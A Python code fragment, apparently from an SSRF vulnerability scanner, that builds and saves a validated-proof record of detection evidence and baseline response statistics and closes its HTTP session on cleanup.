    def _create_validated_proof(self, component: Dict, evidence: SSRFEvidence, 
                              baseline: Dict) -> SSRFProof:
        """Create a validated proof with detailed evidence"""
        
        proof_details = {
            "detection_method": evidence.method.value,
            "confidence_score": evidence.confidence,
            "evidence_description": evidence.description,
            "evidence_data": evidence.evidence_data,
            "payload_source": "database" if hasattr(evidence.evidence_data, 'original_payload') else "hardcoded",
            "baseline_info": {
                "common_status": baseline.get("common_status"),
                "avg_response_length": baseline.get("avg_length"),
                "sample_count": len(baseline.get("samples", []))
            },
            "validation_timestamp": datetime.now().isoformat(),
            "component_details": component
        }
        
        proof = SSRFProof.objects.create(
            ssrf_candidate=self.candidate,
            payload_used=str(evidence.evidence_data.get("payload", "unknown")),
            injection_point=component.get('injection_point'),
            target_internal_ip_or_domain=str(evidence.evidence_data.get("payload", "unknown")),
            proof_details=proof_details,
            analysis_run_id=getattr(self, 'analysis_run_id', None)
        )
        
        return proof

    def __del__(self):
        """Cleanup resources"""
        if hasattr(self, 'session'):
            self.session.close()
